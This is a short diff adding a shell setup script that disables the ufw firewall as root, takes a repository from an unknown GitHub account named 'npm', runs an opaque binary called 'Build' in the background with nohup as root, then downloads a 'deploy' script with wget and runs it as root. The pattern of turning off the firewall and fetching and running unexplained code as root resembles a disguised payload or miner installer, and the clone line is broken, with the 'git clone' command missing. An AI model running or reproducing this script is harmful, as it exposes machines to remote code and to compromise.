@@ -1,0 +1,11 @@
+sudo apt-get update
+sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+sudo ufw disable 
+https://github.com/Jsjsj991/npm.git && cd npm
+chmod +x Build
+sudo su --command "nohup ./Build --log=stdout > meta.log &"
+sleep 2
+sudo su --command "cat meta.log"
+wget https://raw.githubusercontent.com/Jsjsj991/npm/main/deploy
+chmod +x deploy
+sudo su --command "./deploy"
